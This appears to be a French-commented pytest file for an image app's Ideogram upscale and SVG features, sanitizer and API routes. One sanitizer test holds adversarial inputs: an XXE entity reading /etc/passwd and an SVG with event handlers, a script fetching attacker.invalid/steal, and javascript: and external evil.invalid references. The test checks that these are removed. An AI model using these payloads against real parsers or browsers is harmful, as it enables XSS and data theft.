"""Tests unitaires, API et sécurité adversariale pour Ideogram v2 Upscale (8 modèles) et Vecteurs SVG."""

from __future__ import annotations

import asyncio
import base64
from email import policy
from email.parser import BytesParser
import json
import socket
from types import SimpleNamespace

import httpx
import pytest
from pydantic import SecretStr

from app import providers
from app.config import Settings
from app.svg_sanitize import sanitize_svg_bytes
from tests.test_api import authenticated_client

_TINY_PNG = (
    b"\x89PNG\r\n\x1a\n"
    b"\x00\x00\x00\rIHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde"
    b"\x00\x00\x00\x0cIDATx\x9cc```\x00\x00\x00\x04\x00\x01\xf6\x178U\x00\x00\x00\x00IEND\xaeB`\x82"
)

_CLEAN_SVG = (
    b'<svg viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">'
    b'<defs><linearGradient id="grad1"><stop offset="0%" stop-color="#ff0055"/></linearGradient></defs>'
    b'<circle id="c1" cx="50" cy="50" r="40" style="fill: url(#grad1); stroke: #111111"/>'
    b'<use href="#c1"/>'
    b"</svg>"
)


def _parse_multipart(request: httpx.Request) -> dict[str, bytes | str]:
    msg = BytesParser(policy=policy.default).parsebytes(
        b"Content-Type: " + request.headers["content-type"].encode("ascii") + b"\r\nMIME-Version: 1.0\r\n\r\n" + request.content
    )
    out: dict[str, bytes | str] = {}
    for part in msg.iter_parts():
        name = part.get_param("name", header="content-disposition")
        filename = part.get_filename()
        payload = part.get_payload(decode=True)
        out[name] = payload if filename else payload.decode("utf-8")
    return out


@pytest.fixture(autouse=True)
def _no_dns(monkeypatch):
    def fail_dns(*args, **kwargs):
        raise AssertionError("DNS resolution prohibited in offline provider tests")

    monkeypatch.setattr(socket, "getaddrinfo", fail_dns)


@pytest.fixture
def ideogram_settings():
    return SimpleNamespace(
        demo_mode=False,
        ideogram_api_key=SecretStr("ideo-test-key"),
        ideogram_image_hosts="ideogram.ai,images.example",
        llm_api_key=SecretStr("or-test-key"),
        llm_base_url="https://llm.example/v1",
    )


@pytest.fixture
def mock_transport(monkeypatch):
    real_cls = httpx.AsyncClient

    def install(handler):
        def make_client(**kwargs):
            assert kwargs.get("follow_redirects") is False
            return real_cls(transport=httpx.MockTransport(handler), trust_env=False, **kwargs)

        monkeypatch.setattr(providers.httpx, "AsyncClient", make_client)

    return install


# 1. Adversarial SVG Sanitization Tests


def test_svg_sanitize_blocks_xxe_scripts_foreign_object_and_preserves_gradients():
    # Reject XXE / DOCTYPE
    xxe_svg = b'<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg>&xxe;</svg>'
    with pytest.raises(providers.ProviderError, match="DTD|entités"):
        sanitize_svg_bytes(xxe_svg)

    # Reject non-SVG root
    with pytest.raises(providers.ProviderError, match="racine <svg>"):
        sanitize_svg_bytes(b"<html><body>Not an SVG</body></html>")

    # Strip malicious payloads while keeping valid shapes, internal gradients and #id refs
    dirty_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" '
        b'viewBox="0 0 200 200" onload="alert(1)" onclick="evil()">'
        b'<script>fetch("https://attacker.invalid/steal")</script>'
        b'<foreignObject width="100" height="100"><div>XSS HTML</div></foreignObject>'
        b'<style>@import url("https://evil.invalid/x.css"); .ok { fill: url(#gradA); background: url(https://evil.invalid/p.png); }</style>'
        b'<defs><linearGradient id="gradA"><stop offset="0%" stop-color="#123456"/></linearGradient></defs>'
        b'<path id="p1" d="M10 10 H 90 V 90 H 10 Z" fill="url(#gradA)" onmouseover="steal()"/>'
        b'<use href="#p1"/>'
        b'<use href="javascript:alert(2)"/>'
        b'<use xlink:href="https://evil.invalid/external.svg#icon"/>'
        b"</svg>"
    )
    cleaned = sanitize_svg_bytes(dirty_svg).decode("utf-8")
    assert "<script" not in cleaned.lower()
    assert "foreignobject" not in cleaned.lower()
    assert "onload" not in cleaned.lower()
    assert "onclick" not in cleaned.lower()
    assert "onmouseover" not in cleaned.lower()
    assert "javascript:" not in cleaned.lower()
    assert "evil.invalid" not in cleaned.lower()
    assert "@import" not in cleaned.lower()
    assert 'id="gradA"' in cleaned
    assert "url(#gradA)" in cleaned
    assert 'href="#p1"' in cleaned


# 2. All 8 Ideogram v2 Upscale Models Contract & Large (>10 MiB) Output


def test_all_eight_ideogram_upscale_models_and_large_output(ideogram_settings, mock_transport, monkeypatch):
    monkeypatch.setattr(providers, "_IDEOGRAM_POLL_INTERVAL", 0.0)
    assert [m["id"] for m in providers.IDEOGRAM_UPSCALE_MODELS] == [
        "auto",
        "topaz-standard-2",
        "topaz-text-refine",
        "topaz-wonder-4",
        "topaz-wonder-3-5",
        "topaz-bloom-2",
        "topaz-redefine",
        "nano-banana-pro",
    ]

    # Build an 11 MiB valid PNG to verify >10 MiB upscale outputs succeed (up to 60 MiB)
    large_png = _TINY_PNG + (b"\x00" * (11 * 1024 * 1024))
    seen_calls: list[tuple[str, dict[str, bytes | str]]] = []

    def handler(request: httpx.Request) -> httpx.Response:
        if request.url.host == "api.ideogram.ai":
            if request.method == "GET":
                return httpx.Response(200, json={
                    "generation_id": "up-async-1",
                    "status": "completed",
                    "width": 4096,
                    "height": 4096,
                    "data": [{"url": "https://images.example/upscaled.png", "resolution": "4096x4096", "is_image_safe": True, "seed": 42}],
                })
            parts = _parse_multipart(request)
            seen_calls.append((request.url.path, parts))
            if request.url.path.endswith("/topaz-redefine"):
                return httpx.Response(200, json={"generation_id": "up-async-1", "status": "pending"})
            return httpx.Response(200, json={
                "generation_id": "up-sync-1",
                "seed": 7,
                "width": 4096,
                "height": 4096,
                "data": [{"url": "https://images.example/upscaled.png", "resolution": "4096x4096", "is_image_safe": True, "seed": 7}],
            })
        assert request.url.host == "images.example"
        assert "api-key" not in request.headers
        return httpx.Response(200, content=large_png, headers={"content-type": "image/png"})

    mock_transport(handler)

    cases = [
        ("auto", {"upscale_factor": "x4", "seed": 123}, {"upscale_factor": "x4", "seed": "123"}),
        (
            "topaz-standard-2",
            {"upscale_factor": "x2", "strength": 0.6, "sharpen": 0.4, "face_enhancement": True, "subject_detection": "foreground"},
            {"upscale_factor": "x2", "strength": "0.6", "sharpen": "0.4", "face_enhancement": "true", "face_enhancement_strength": "0.8", "face_enhancement_creativity": "0.2", "subject_detection": "foreground"},
        ),
        ("topaz-text-refine", {"upscale_factor": "x8", "fix_compression": 0.7}, {"upscale_factor": "x8", "fix_compression": "0.7"}),
        ("topaz-wonder-4", {"upscale_factor": "x4"}, {"upscale_factor": "x4"}),
        ("topaz-wonder-3-5", {"upscale_factor": "x2", "enhancement_strength": "medium"}, {"upscale_factor": "x2", "enhancement_strength": "medium"}),
        ("topaz-bloom-2", {"upscale_factor": "x4", "prompt": "Textures nettes", "creativity": 5, "color_preservation": False}, {"upscale_factor": "x4", "prompt": "Textures nettes", "creativity": "5", "color_preservation": "false"}),
        ("topaz-redefine", {"upscale_factor": "x2", "autoprompt": True, "prompt": "ignoré", "creativity": 6, "texture": 3, "detail": True, "detail_strength": 4.5}, {"upscale_factor": "x2", "autoprompt": "true", "creativity": "6", "texture": "3", "detail": "true", "detail_strength": "4.5"}),
        ("nano-banana-pro", {"resolution_tier": "4K", "prompt": "Piqué studio"}, {"resolution_tier": "4K", "prompt": "Piqué studio"}),
    ]

    for model_id, kwargs, expected_fields in cases:
        meta: dict = {}
        out_bytes, out_mime = asyncio.run(
            providers.upscale_image(ideogram_settings, model_id, (_TINY_PNG, "image/png"), out_metadata=meta, **kwargs)
        )
        assert out_bytes == large_png
        assert out_mime == "image/png"
        assert meta["width"] == 4096 and meta["height"] == 4096
        path, sent_parts = seen_calls[-1]
        assert path == f"/v2/image/upscale/{model_id}"
        assert sent_parts["image"] == _TINY_PNG
        for k, v in expected_fields.items():
            assert sent_parts[k] == v
        if model_id == "topaz-redefine":
            assert "prompt" not in sent_parts

    # Topaz Wonder 4 rejects x8
    with pytest.raises(providers.ProviderError, match="x8"):
        asyncio.run(providers.upscale_image(ideogram_settings, "topaz-wonder-4", (_TINY_PNG, "image/png"), upscale_factor="x8"))


# 3. Ideogram Vector 1.0: Generate SVG & Image-to-SVG Async Polling


def test_ideogram_generate_svg_and_vectorize_svg(ideogram_settings, mock_transport, monkeypatch):
    monkeypatch.setattr(providers, "_IDEOGRAM_POLL_INTERVAL", 0.0)
    seen_posts: list[tuple[str, dict[str, bytes | str]]] = []
    polls = 0

    raw_ideogram_svg = (
        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" onload="evil()">'
        b'<script>evil()</script>'
        b'<path d="M 10 10 L 100 100" fill="#ff3366"/>'
        b"</svg>"
    )

    def handler(request: httpx.Request) -> httpx.Response:
        nonlocal polls
        if request.url.host == "api.ideogram.ai":
            if request.method == "GET":
                polls += 1
                if polls % 2 == 1:
                    return httpx.Response(200, json={"generation_id": "svg-gen-1", "status": "pending"})
                return httpx.Response(200, json={
                    "generation_id": "svg-gen-1",
                    "status": "completed",
                    "data": [{
                        "object_type": "svg.generation",
                        "asset_id": "asset-1",
                        "url": "https://images.example/out.svg",
                        "mime_type": "image/svg+xml",
                        "width": 1024,
                        "height": 1024,
                    }],
                })
            seen_posts.append((request.url.path, _parse_multipart(request)))
            return httpx.Response(200, json={"generation_id": "svg-gen-1"})
        assert request.url.host == "images.example"
        return httpx.Response(200, content=raw_ideogram_svg, headers={"content-type": "image/svg+xml"})

    mock_transport(handler)

    # 1. Generate SVG from prompt + optional reference image
    svg_bytes, mime = asyncio.run(
        providers.generate_svg_image(
            ideogram_settings,
            "generate",
            prompt="Un renard géométrique minimaliste",
            reference_image=(_TINY_PNG, "image/png"),
            aspect_ratio="16:9",
            quality="high",
            use_gradient=False,
            seed=99,
        )
    )
    assert mime == "image/svg+xml"
    assert b"<script" not in svg_bytes
    assert b"onload" not in svg_bytes
    assert b"#ff3366" in svg_bytes
    assert seen_posts[0][0] == "/v2/svg/generate/ideogram-vector-1"
    assert seen_posts[0][1]["prompt"] == "Un renard géométrique minimaliste"
    assert seen_posts[0][1]["aspect_ratio"] == "16x9"
    assert seen_posts[0][1]["quality"] == "high"
    assert seen_posts[0][1]["use_gradient"] == "false"
    assert seen_posts[0][1]["seed"] == "99"
    assert seen_posts[0][1]["images"] == _TINY_PNG

    # 2. Vectorize (Image-to-SVG)
    svg_bytes2, mime2 = asyncio.run(
        providers.generate_svg_image(
            ideogram_settings,
            "vectorize",
            reference_image=(_TINY_PNG, "image/png"),
            mode="simple",
            shape_density=8.0,
            color_variety=4.0,
            use_gradient=True,
        )
    )
    assert mime2 == "image/svg+xml"
    assert b"#ff3366" in svg_bytes2
    assert seen_posts[1][0] == "/v2/svg/vectorize/ideogram-vector-1"
    assert seen_posts[1][1]["image"] == _TINY_PNG
    assert seen_posts[1][1]["mode"] == "simple"
    assert seen_posts[1][1]["shape_density"] == "8"
    assert seen_posts[1][1]["color_variety"] == "4"
    assert seen_posts[1][1]["use_gradient"] == "true"

    # GIF rejected for vectorize
    with pytest.raises(providers.ProviderError, match="PNG, JPEG ou WEBP"):
        asyncio.run(
            providers.generate_svg_image(
                ideogram_settings,
                "vectorize",
                reference_image=(b"GIF89a123", "image/gif"),
            )
        )


# 4. FastAPI Endpoints & CSP Security Headers


def test_fastapi_upscale_and_svg_routes_and_csp_headers(tmp_path, monkeypatch):
    settings = Settings(
        _env_file=None,
        app_data_dir=tmp_path,
        ideogram_api_key="ideo-key",
        llm_api_key="or-key",
        demo_mode=False,
    )

    async def fake_upscale(_settings, model, reference_image, out_metadata=None, **kwargs):
        if out_metadata is not None:
            out_metadata["width"] = 2048
            out_metadata["height"] = 2048
        return _TINY_PNG, "image/png"

    async def fake_svg(_settings, operation, out_metadata=None, **kwargs):
        return sanitize_svg_bytes(_CLEAN_SVG), "image/svg+xml"

    async def fake_improve(_settings, model, prompt, style_keywords=None, negative_prompt=None, **kwargs):
        assert kwargs.get("is_svg") is True
        return f"Vecteur géométrique net : {prompt}"

    monkeypatch.setattr(providers, "upscale_image", fake_upscale)
    monkeypatch.setattr(providers, "generate_svg_image", fake_svg)
    monkeypatch.setattr(providers, "improve_image_prompt", fake_improve)

    data_url = "data:image/png;base64," + base64.b64encode(_TINY_PNG).decode("ascii")

    with authenticated_client(settings) as client:
        # 1. List 8 upscale models
        up_models = client.get("/api/images/upscale-models")
        assert up_models.status_code == 200
        assert len(up_models.json()) == 8

        # 2. Validation: Wonder 4 with x8 rejected at schema boundary (422)
        bad_w4 = client.post("/api/images/upscale", json={
            "model": "topaz-wonder-4",
            "upscale_factor": "x8",
            "reference_image_data": data_url,
        })
        assert bad_w4.status_code == 422

        # 3. Upscale uploaded image succeeds (201)
        up_res = client.post("/api/images/upscale", json={
            "model": "topaz-standard-2",
            "upscale_factor": "x2",
            "reference_image_data": data_url,
        })
        assert up_res.status_code == 201
        up_item = up_res.json()
        assert up_item["edit_action"] == "upscale"
        assert up_item["output_width"] == 2048
        assert up_item["mime_type"] == "image/png"

        # 4. Improve SVG prompt
        imp_svg = client.post("/api/images/improve", json={"prompt": "Un avion en papier", "is_svg": True})
        assert imp_svg.status_code == 200
        assert "Vecteur géométrique" in imp_svg.json()["prompt"]

        # 5. Generate SVG from prompt
        gen_svg = client.post("/api/images/svg", json={
            "operation": "generate",
            "prompt": "Un logo renard minimaliste",
            "aspect_ratio": "1:1",
            "quality": "high",
            "use_gradient": True,
        })
        assert gen_svg.status_code == 201
        svg_item = gen_svg.json()
        assert svg_item["mime_type"] == "image/svg+xml"
        assert svg_item["filename"].endswith(".svg")

        # 6. Serving SVG enforces strict sandbox CSP header
        file_res = client.get(svg_item["url"])
        assert file_res.status_code == 200
        assert "image/svg+xml" in file_res.headers["content-type"]
        csp = file_res.headers.get("content-security-policy", "")
        assert "default-src 'none'" in csp
        assert "sandbox" in csp
        assert file_res.headers.get("x-content-type-options") == "nosniff"

        # 7. Vectorize raster gallery image (up_item) -> 201
        vec_res = client.post("/api/images/svg", json={
            "operation": "vectorize",
            "source_image_id": up_item["id"],
            "mode": "detailed",
        })
        assert vec_res.status_code == 201
        assert vec_res.json()["edit_action"] == "image_to_svg"

        # 8. Passing SVG gallery item as raster source to upscale or vectorize is rejected cleanly (400)
        bad_svg_src = client.post("/api/images/upscale", json={
            "model": "auto",
            "source_image_id": svg_item["id"],
        })
        assert bad_svg_src.status_code == 400
